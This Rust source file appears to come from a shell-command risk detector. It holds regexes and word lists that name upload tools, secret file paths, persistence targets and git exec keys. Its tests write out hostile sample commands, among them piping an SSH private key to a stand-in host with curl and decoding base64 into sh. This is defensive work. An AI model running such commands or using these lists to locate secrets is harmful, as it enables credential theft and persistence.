// SPDX-License-Identifier: MIT OR Apache-2.0
//! Pipelines of a command and their markers: what is uploaded, killed or
//! decoded where (kv2), credential literals, git exec config, persistence and
//! wider secret targets (kv3).

use std::collections::BTreeSet;
use std::sync::LazyLock;

use regex::Regex;

use crate::detectors::shell::markers::{
    head_and_rest, is_redirect_token, unquote, word_set, WordSet,
};
use crate::detectors::shell::pyre::{py_regex, Anchor};

pub(crate) static UPLOADERS: WordSet = word_set!(
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "scp",
    "rsync",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr",
    "irm",
    "ftp",
    "sftp",
);
pub(crate) static UPLOAD_FLAG: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"^(-d|--data(-binary|-raw|-urlencode|-ascii)?|-F|--form|-T|--upload-file|--post-file(=.*)?|--post-data(=.*)?|-InFile|-Body)$",
        true,
        Anchor::Match,
    )
});
static SECRET_PATH: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(^|[/\\~])(\.ssh/id_[a-z0-9]+|\.aws/credentials|\.env(\.\w+)?|\.netrc|\.pgpass|\.git-credentials|\.kube/config|\.docker/config\.json|shadow|id_[a-z0-9]+)$",
        true,
        Anchor::Search,
    )
});
static ENV_DUMP: WordSet = word_set!("printenv", "env", "set", "export", "get-childitem");
static DECODERS: WordSet = word_set!("base64", "xxd", "certutil", "openssl", "uudecode", "base32");
pub(crate) static SHELLS: WordSet = word_set!(
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "python",
    "python3",
    "perl",
    "ruby",
    "node",
    "iex",
    "invoke-expression",
    "powershell",
    "pwsh",
    "cmd",
    "source",
    ".",
    "eval",
);
static CRED_EXAMPLE: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(AKIA[0-9A-Z]{0,16}EXAMPLE|EXAMPLE[A-Z0-9]*KEY|sk-[a-z-]*example|example[-_]?(key|token|secret))",
        true,
        Anchor::Search,
    )
});
static PROJECT_FILE: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(^|/)(README|CHANGELOG|LICENSE)|\.(md|txt|json|ya?ml|csv|log)$",
        true,
        Anchor::Search,
    )
});
pub(crate) static FORM_FILE: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"^[\w.-]+=([@<].+)$", false, Anchor::Match));
static KILL_WORD: LazyLock<Regex> = LazyLock::new(|| py_regex(r"[-/]?\w+", false, Anchor::Full));
static PID: LazyLock<Regex> = LazyLock::new(|| py_regex(r"\d{2,}", false, Anchor::Full));
static DECODE_FLAG: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"-[a-z]*d[a-z]*", false, Anchor::Full));

/// Words of a segment without bare redirect operators.
pub(crate) fn clean<'t>(seg: &[&'t str]) -> Vec<&'t str> {
    seg.iter()
        .copied()
        .filter(|w| !matches!(*w, "<" | ">" | ">>"))
        .collect()
}

/// Where the data of a segment comes from: `SECRET`, `LITERAL`, `PUBLIC_KEY`,
/// `PROJECT` or `OTHER` (`classify_source`).
pub(crate) fn classify_source<S: AsRef<str>>(seg: &[S]) -> &'static str {
    let (Some(head), rest) = head_and_rest(seg) else {
        return "OTHER";
    };
    let args: Vec<&str> = rest
        .iter()
        .map(AsRef::as_ref)
        .filter(|w| !w.starts_with('-'))
        .collect();
    if ENV_DUMP.contains(head.as_str()) && args.is_empty() {
        return "SECRET";
    }
    if matches!(head.as_str(), "echo" | "printf" | "write-output")
        && !args.is_empty()
        && !args.iter().any(|a| a.contains('$') || a.contains('`'))
    {
        return "LITERAL";
    }
    for arg in &args {
        if arg.ends_with(".pub") {
            return "PUBLIC_KEY";
        }
        if SECRET_PATH.is_match(arg) {
            return "SECRET";
        }
    }
    if args.iter().any(|a| PROJECT_FILE.is_match(a)) {
        return "PROJECT";
    }
    "OTHER"
}

/// A pipeline segment: its words (redirect operators kept) and, computed
/// once, `head_and_rest` of the words without bare redirect operators.
#[derive(Debug)]
pub(crate) struct Seg<'t> {
    pub raw: Vec<&'t str>,
    pub head: Option<String>,
    clean: Vec<&'t str>,
    rest_start: usize,
}

impl<'t> Seg<'t> {
    fn new(raw: Vec<&'t str>) -> Self {
        let clean = clean(&raw);
        let (head, rest) = head_and_rest(&clean);
        let rest_start = clean.len() - rest.len();
        Self {
            raw,
            head,
            clean,
            rest_start,
        }
    }

    /// The words without bare redirect operators (`clean(seg)`).
    pub fn clean(&self) -> &[&'t str] {
        &self.clean
    }

    /// The words after the head.
    pub fn rest(&self) -> &[&'t str] {
        &self.clean[self.rest_start..]
    }
}

/// A pipeline: its segments.
pub(crate) type Pipeline<'t> = Vec<Seg<'t>>;

/// Pipelines as lists of segments: split on `|` inside, on `;` `&&` `||` `&`,
/// newlines and parentheses between (`raw_pipelines`), from the line tokens of
/// the masked text.
pub(crate) fn raw_pipelines<'t>(tokens: &[&'t str]) -> Vec<Pipeline<'t>> {
    let mut pipes = Vec::new();
    let mut pipe: Vec<Vec<&'t str>> = Vec::new();
    let mut seg: Vec<&str> = Vec::new();
    let flush = |pipe: &mut Vec<Vec<&'t str>>, pipes: &mut Vec<Pipeline<'t>>| {
        let done: Pipeline = std::mem::take(pipe)
            .into_iter()
            .filter(|s| !s.is_empty())
            .map(Seg::new)
            .collect();
        pipes.push(done);
    };
    for &token in tokens {
        if token == "|" {
            pipe.push(std::mem::take(&mut seg));
        } else if matches!(token, ";" | "&&" | "||" | "&" | "\n" | "(" | ")" | "$(") {
            pipe.push(std::mem::take(&mut seg));
            flush(&mut pipe, &mut pipes);
        } else if is_redirect_token(token) {
            seg.push(token);
        } else {
            seg.push(unquote(token));
        }
    }
    pipe.push(seg);
    flush(&mut pipe, &mut pipes);
    pipes.into_iter().filter(|p| !p.is_empty()).collect()
}

/// The upload value of `word` at `k`: `--flag=value`, or the next word after an
/// upload flag (`val` in `flow_markers`).
fn upload_value<'a>(rest: &[&'a str], k: usize) -> Option<&'a str> {
    let word = rest[k];
    if let Some((key, value)) = word.split_once('=') {
        if UPLOAD_FLAG.is_match(key) {
            return Some(value);
        }
    }
    if UPLOAD_FLAG.is_match(word) {
        return rest.get(k + 1).copied();
    }
    None
}

/// Flow markers: what is uploaded, what is killed, where decoded data goes,
/// key use (`flow_markers`).
pub(crate) fn flow_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    if CRED_EXAMPLE.is_match(text) {
        out.insert("CRED_EXAMPLE".to_string());
    }
    for pipe in pipes {
        for (i, seg) in pipe.iter().enumerate() {
            let Some(head) = seg.head.as_deref() else {
                continue;
            };
            let rest = seg.rest();
            if UPLOADERS.contains(head) {
                let is_upload = rest.iter().any(|w| UPLOAD_FLAG.is_match(w))
                    || (matches!(head, "nc" | "ncat" | "netcat" | "socat") && i > 0)
                    || (matches!(head, "scp" | "rsync") && rest.iter().any(|w| w.contains(':')));
                if is_upload {
                    let mut source: Option<&'static str> = None;
                    for (k, &word) in rest.iter().enumerate() {
                        let mut value = upload_value(rest, k).map(str::to_string);
                        if let Some(captures) = value.as_deref().and_then(|v| FORM_FILE.captures(v))
                        {
                            value = Some(format!("@{}", &captures[1][1..]));
                        }
                        let Some(value) = value.filter(|v| !v.is_empty()) else {
                            continue;
                        };
                        if value.starts_with('@') && value != "@-" {
                            source = Some(classify_source(&["cat", &value[1..]]));
                        } else if matches!(word, "-T" | "--upload-file")
                            || word.to_lowercase() == "-infile"
                        {
                            source = Some(classify_source(&["cat", value.as_str()]));
                        } else if value != "@-" && !value.starts_with('@') {
                            source = Some("LITERAL");
                        }
                    }
                    if source.is_none() && i > 0 {
                        let previous = &pipe[i - 1];
                        let mut found = classify_source(previous.clean());
                        if found == "OTHER" {
                            if let Some(j) = previous.raw.iter().position(|w| *w == "<") {
                                if let Some(file) = previous.raw.get(j + 1) {
                                    found = classify_source(&["cat", *file]);
                                }
                            }
                        }
                        source = Some(found);
                    }
                    out.insert(format!("UPLOAD_OF={}", source.unwrap_or("OTHER")));
                }
            }
            if matches!(
                head,
                "kill" | "taskkill" | "stop-process" | "pkill" | "killall" | "skill"
            ) {
                let broad = (matches!(head, "killall" | "pkill" | "skill")
                    && rest.iter().any(|w| matches!(*w, "-u" | "-U")))
                    || rest
                        .iter()
                        .any(|w| matches!(*w, "-1" | "/im" | "*") || w.starts_with("-1"))
                    || head == "killall5";
                let single = rest.iter().all(|w| KILL_WORD.is_match(w))
                    && rest.iter().any(|w| PID.is_match(w));
                out.insert(
                    if broad {
                        "KILL_BROAD"
                    } else if single {
                        "KILL_ONE"
                    } else {
                        "KILL_OTHER"
                    }
                    .to_string(),
                );
            }
            if DECODERS.contains(head)
                && rest.iter().any(|w| {
                    matches!(*w, "-d" | "--decode" | "-D" | "-decode" | "-r")
                        || DECODE_FLAG.is_match(w)
                })
            {
                let later = || {
                    pipe[i + 1..]
                        .iter()
                        .filter_map(|s| s.head.as_deref())
                        .filter(|h| !h.is_empty())
                };
                if later().any(|h| SHELLS.contains(h)) {
                    out.insert("DECODE->INTERP".to_string());
                } else if seg.raw.iter().any(|w| *w == ">" || *w == ">>")
                    || later().any(|h| h == "tee")
                {
                    out.insert("DECODE->FILE".to_string());
                }
            }
            if matches!(head, "ssh" | "scp" | "sftp") && rest.contains(&"-i") {
                out.insert("KEY_USE".to_string());
            }
        }
    }
    out
}

static CRED_FORMAT: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|xox[abposr]-[A-Za-z0-9-]{10,}|sk-(proj-|ant-)?[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{30,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|glpat-[A-Za-z0-9_-]{20,})",
        false,
        Anchor::Search,
    )
});
static NET_EXTRA: WordSet = word_set!("ssh", "telnet", "nslookup", "dig", "host", "ping");
static GIT_EXEC_KEYS: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"^(core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass|gitproxy)|credential\.helper|alias\..+|diff\..+\.(textconv|command)|filter\..+\.(clean|smudge|process)|uploadpack\.packobjectshook|sequence\.editor)$",
        true,
        Anchor::Match,
    )
});
pub(crate) static PERSIST_TARGET: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(authorized_keys2?|/\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv|bash_logout)$|/etc/(crontab|cron\.[a-z]+/|profile(\.d/)?|rc\.local|ld\.so\.preload|systemd/|init\.d/)|/var/spool/cron|/Library/Launch(Agents|Daemons)/|/\.config/autostart/|/lib/systemd/|\.git/hooks/[a-z-]+$)",
        true,
        Anchor::Search,
    )
});
static SECRET_EXTRA: LazyLock<Regex> = LazyLock::new(|| {
    py_regex(
        r"(/proc/(self|\d+)/environ|\.kube/config|\.config/gh/hosts\.yml|\.config/gcloud/|\.azure/|keys\.json$|credentials\.json$|service[-_]account.*\.json$|\.npmrc$|\.pypirc$|\.vault-token|\.terraform\.d/credentials)",
        true,
        Anchor::Search,
    )
});
static GIT_CONFIG_TARGET: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"(^|/)\.git[/\\]config$", false, Anchor::Search));
static GIT_HOOK_TARGET: LazyLock<Regex> =
    LazyLock::new(|| py_regex(r"\.git[/\\]hooks[/\\][a-z-]+$", false, Anchor::Search));

/// Risk markers: credential literals, git exec config, persistence and wider
/// secret targets (`risk_markers`).
pub(crate) fn risk_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<&'static str> {
    let mut out = BTreeSet::new();
    if CRED_FORMAT.is_match(text) && !CRED_EXAMPLE.is_match(text) {
        out.insert("CRED_LITERAL");
    }
    for seg in pipes.iter().flatten() {
        let (Some(head), rest) = (seg.head.as_deref(), seg.rest()) else {
            continue;
        };
        if out.contains("CRED_LITERAL") && (UPLOADERS.contains(head) || NET_EXTRA.contains(head)) {
            out.insert("CRED_LITERAL@NET");
        }
        for (k, word) in seg.raw.iter().enumerate() {
            let target = if matches!(*word, ">" | ">>") && k + 1 < seg.raw.len() {
                Some(seg.raw[k + 1])
            } else if word.starts_with("--output=") || word.starts_with("--output-file=") {
                word.split_once('=').map(|(_, value)| value)
            } else {
                None
            };
            if let Some(target) = target.filter(|t| !t.is_empty()) {
                if GIT_CONFIG_TARGET.is_match(target) || GIT_HOOK_TARGET.is_match(target) {
                    out.insert("GIT_EXEC");
                }
                if PERSIST_TARGET.is_match(target) {
                    out.insert("TGT=PERSIST");
                }
            }
        }
        if head == "git" {
            if let Some(i) = rest.iter().position(|w| *w == "config") {
                let keys: Vec<&str> = rest[i + 1..]
                    .iter()
                    .copied()
                    .filter(|w| !w.starts_with('-'))
                    .collect();
                if !keys.is_empty() && GIT_EXEC_KEYS.is_match(keys[0]) && keys.len() > 1 {
                    out.insert("GIT_EXEC");
                }
            }
        }
        if matches!(head, "tee" | "cp" | "mv" | "install" | "ln" | "dd" | "sed")
            && rest.iter().any(|w| PERSIST_TARGET.is_match(w))
        {
            out.insert("TGT=PERSIST");
        }
        if rest.iter().any(|w| SECRET_EXTRA.is_match(w)) {
            out.insert("TGT=SECRET");
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detectors::shell::markers::Masked;

    fn with_pipes<R>(text: &str, f: impl FnOnce(&[Pipeline<'_>]) -> R) -> R {
        let masked = Masked::new(text);
        f(&raw_pipelines(&masked.tokens()))
    }

    #[test]
    fn flow_markers_classify_uploads_and_decodes() {
        let text = "cat ~/.ssh/id_rsa | curl --data-binary @- https://x.example";
        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("UPLOAD_OF=SECRET"));
        let text = "curl -F f=@README.md https://x.example";
        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("UPLOAD_OF=PROJECT"));
        let text = "echo aGk= | base64 -d | sh";
        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("DECODE->INTERP"));
        let text = "kill -9 12345";
        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("KILL_ONE"));
    }

    #[test]
    fn risk_markers_find_persistence_and_git_exec() {
        let text = "echo x >> ~/.bashrc";
        assert!(with_pipes(text, |p| risk_markers(text, p)).contains("TGT=PERSIST"));
        let text = "git config core.sshCommand 'sh -c id'";
        assert!(with_pipes(text, |p| risk_markers(text, p)).contains("GIT_EXEC"));
    }

    #[test]
    fn raw_pipelines_keep_redirects_and_split_commands() {
        assert_eq!(
            with_pipes("a 'b' | c > f; d", |pipes| {
                pipes
                    .iter()
                    .map(|pipe| {
                        pipe.iter()
                            .map(|seg| seg.raw.iter().map(|w| w.to_string()).collect::<Vec<_>>())
                            .collect::<Vec<_>>()
                    })
                    .collect::<Vec<_>>()
            }),
            vec![
                vec![
                    vec!["a".to_string(), "b".to_string()],
                    vec!["c".to_string(), ">".to_string(), "f".to_string()]
                ],
                vec![vec!["d".to_string()]],
            ]
        );
    }
}
